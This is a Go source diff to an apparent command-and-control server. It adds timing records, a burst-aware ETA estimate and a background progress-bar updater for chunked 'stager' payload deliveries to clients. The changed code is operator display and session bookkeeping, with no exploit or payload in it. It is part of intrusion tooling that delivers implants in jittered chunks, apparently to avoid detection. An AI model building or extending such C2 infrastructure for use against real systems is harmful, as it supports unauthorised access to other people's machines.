@@ -83,15 +83,19 @@ type ExpectedResult struct {
 
 // StagerSession tracks a stager deployment session
 type StagerSession struct {
-	ClientIP     string
-	OS           string
-	Arch         string
-	Chunks       []string // Base64-encoded chunks
-	TotalChunks  int
-	CreatedAt    time.Time
-	LastActivity time.Time // Updated on each chunk request to prevent premature expiration
-	StartedAt    time.Time // When first chunk was requested
-	LastChunk    *int      // Last chunk index sent (pointer to differentiate nil from 0)
+	ClientIP        string
+	OS              string
+	Arch            string
+	Chunks          []string // Base64-encoded chunks
+	TotalChunks     int
+	CreatedAt       time.Time
+	LastActivity    time.Time   // Updated on each chunk request to prevent premature expiration
+	StartedAt       time.Time   // When first chunk was requested
+	LastChunk       *int        // Last chunk index sent (pointer to differentiate nil from 0)
+	LastChunkTime   time.Time   // When last chunk was sent
+	ChunkTimes      []time.Time // Timestamps of when each chunk was sent
+	ProgressRunning bool        // Track if progress updater is running
+	ProgressDone    chan bool   // Signal to stop progress updater
 }
 
 // C2Manager handles beacon management and tasking
@@ -133,24 +137,61 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter) *
 	return c2
 }
 
-// calculateStagerETA estimates time remaining for stager download based on jitter configuration
+// calculateStagerETA calculates ETA based on burst pattern analysis
 // Returns a human-readable duration string (e.g., "2m 30s", "45s")
-func calculateStagerETA(chunksRemaining int, jitter StagerJitter) string {
+func calculateStagerETA(session *StagerSession, currentChunk int) string {
+	chunksRemaining := session.TotalChunks - currentChunk
+
 	if chunksRemaining <= 0 {
 		return "complete"
 	}
 
-	// Calculate average jitter delay per chunk
-	avgJitterMs := float64(jitter.JitterMinMs+jitter.JitterMaxMs) / 2.0
+	// Need at least a few chunks to establish pattern
+	if len(session.ChunkTimes) < 3 {
+		return "calculating..."
+	}
 
-	// Calculate number of burst pauses
-	burstCount := chunksRemaining / jitter.ChunksPerBurst
+	now := time.Now()
 
-	// Total estimated time in milliseconds
-	totalMs := (float64(chunksRemaining) * avgJitterMs) + (float64(burstCount) * float64(jitter.BurstPauseMs))
+	// Analyze recent chunk timing to detect burst vs pause
+	recentChunks := 5
+	if len(session.ChunkTimes) < recentChunks {
+		recentChunks = len(session.ChunkTimes)
+	}
 
-	// Convert to duration
-	duration := time.Duration(totalMs) * time.Millisecond
+	// Look at the last few chunks to see if we're in a burst or pause
+	var recentDelays []float64
+	for i := len(session.ChunkTimes) - recentChunks; i < len(session.ChunkTimes)-1; i++ {
+		delay := session.ChunkTimes[i+1].Sub(session.ChunkTimes[i]).Seconds()
+		recentDelays = append(recentDelays, delay)
+	}
+
+	// Calculate average delay in recent chunks
+	var avgRecentDelay float64
+	for _, d := range recentDelays {
+		avgRecentDelay += d
+	}
+	avgRecentDelay /= float64(len(recentDelays))
+
+	// Determine if we're currently in a burst (fast chunks) or pause (slow/waiting)
+	timeSinceLastChunk := now.Sub(session.LastChunkTime).Seconds()
+	inBurst := avgRecentDelay < 5.0 // Less than 5 seconds between chunks = burst mode
+
+	// Calculate overall transfer rate including pauses
+	totalElapsed := now.Sub(session.StartedAt).Seconds()
+	overallRate := totalElapsed / float64(currentChunk) // seconds per chunk including all delays
+
+	// Estimate time remaining
+	var estimatedSeconds float64
+	if inBurst && timeSinceLastChunk < 10 {
+		// Currently in burst - use overall rate (includes past pauses)
+		estimatedSeconds = overallRate * float64(chunksRemaining)
+	} else {
+		// In pause or waiting - add current wait time + remaining chunks at overall rate
+		estimatedSeconds = timeSinceLastChunk + (overallRate * float64(chunksRemaining))
+	}
+
+	duration := time.Duration(estimatedSeconds) * time.Second
 
 	// Format as human-readable string
 	if duration < time.Minute {
@@ -200,25 +241,72 @@ func renderProgressBar(current, total int, eta string, clientIP string) string {
 		bar, percentage, current, total, eta, clientIP)
 }
 
+// startProgressUpdater starts a goroutine that continuously updates the progress bar
+func (c2 *C2Manager) startProgressUpdater(session *StagerSession, clientIP string) {
+	if session.ProgressRunning {
+		return // Already running
+	}
+
+	session.ProgressRunning = true
+	session.ProgressDone = make(chan bool)
+
+	go func() {
+		ticker := time.NewTicker(1 * time.Second)
+		defer ticker.Stop()
+
+		for {
+			select {
+			case <-session.ProgressDone:
+				return
+			case <-ticker.C:
+				c2.mutex.RLock()
+				if session.LastChunk == nil {
+					c2.mutex.RUnlock()
+					continue
+				}
+				current := *session.LastChunk + 1
+				if current >= session.TotalChunks {
+					c2.mutex.RUnlock()
+					return
+				}
+
+				eta := calculateStagerETA(session, current)
+				progressBar := renderProgressBar(current, session.TotalChunks, eta, clientIP)
+				fmt.Print(progressBar)
+				c2.mutex.RUnlock()
+			}
+		}
+	}()
+}
+
+// stopProgressUpdater stops the progress updater goroutine
+func (c2 *C2Manager) stopProgressUpdater(session *StagerSession) {
+	if session.ProgressRunning && session.ProgressDone != nil {
+		close(session.ProgressDone)
+		session.ProgressRunning = false
+	}
+}
+
 // logStagerProgress displays or updates the progress bar for stager downloads
 func (c2 *C2Manager) logStagerProgress(session *StagerSession, chunkIndex int, clientIP string) {
 	current := chunkIndex + 1
-	chunksRemaining := session.TotalChunks - current
-	eta := calculateStagerETA(chunksRemaining, c2.jitterConfig)
+	eta := calculateStagerETA(session, current)
 
 	progressBar := renderProgressBar(current, session.TotalChunks, eta, clientIP)
 
-	// If this is the first chunk, print on new line
+	// If this is the first chunk, print on new line and start progress updater
 	if chunkIndex == 0 {
 		fmt.Print("\n" + progressBar)
+		c2.startProgressUpdater(session, clientIP)
 	} else if current == session.TotalChunks {
-		// Final chunk - print with newline to complete the progress bar
+		// Final chunk - stop updater and print completion
+		c2.stopProgressUpdater(session)
 		elapsed := time.Since(session.StartedAt)
 		fmt.Printf("\r[Stager] %s %.1f%% (%d/%d chunks) Complete in %s - %s\n",
 			"[========================================]", 100.0, session.TotalChunks, session.TotalChunks,
 			formatDuration(elapsed), clientIP)
 	} else {
-		// Update in place (carriage return handled in renderProgressBar)
+		// Chunk received - the updater will continue showing progress
 		fmt.Print(progressBar)
 	}
 }
@@ -255,6 +343,8 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 		// Clean up expired stager sessions
 		for ip, session := range c2.stagerSessions {
 			if now.Sub(session.LastActivity) > stagerSessionTimeout {
+				// Stop progress updater before deleting session
+				c2.stopProgressUpdater(session)
 				delete(c2.stagerSessions, ip)
 				if c2.debug {
 					logf("[C2] Cleaned up expired stager session for %s (inactive for %v)", ip, now.Sub(session.LastActivity))
@@ -1005,11 +1095,13 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 	}
 
 	// Update last activity timestamp to keep session alive during active downloads
-	session.LastActivity = time.Now()
+	now := time.Now()
+	session.LastActivity = now
 
 	// Initialize start time on first chunk
 	if chunkIndex == 0 && session.StartedAt.IsZero() {
-		session.StartedAt = time.Now()
+		session.StartedAt = now
+		session.ChunkTimes = make([]time.Time, 0, session.TotalChunks)
 	}
 
 	// Validate chunk index
@@ -1027,8 +1119,10 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 	if !isDuplicate {
 		// Only update progress bar if this is a NEW chunk (different from last one)
 		if session.LastChunk == nil || *session.LastChunk != chunkIndex {
-			// Update last chunk sent
+			// Update last chunk sent and record timing
 			session.LastChunk = &chunkIndex
+			session.LastChunkTime = now
+			session.ChunkTimes = append(session.ChunkTimes, now)
 
 			// Display progress bar instead of individual log lines
 			c2.logStagerProgress(session, chunkIndex, stagerIP)
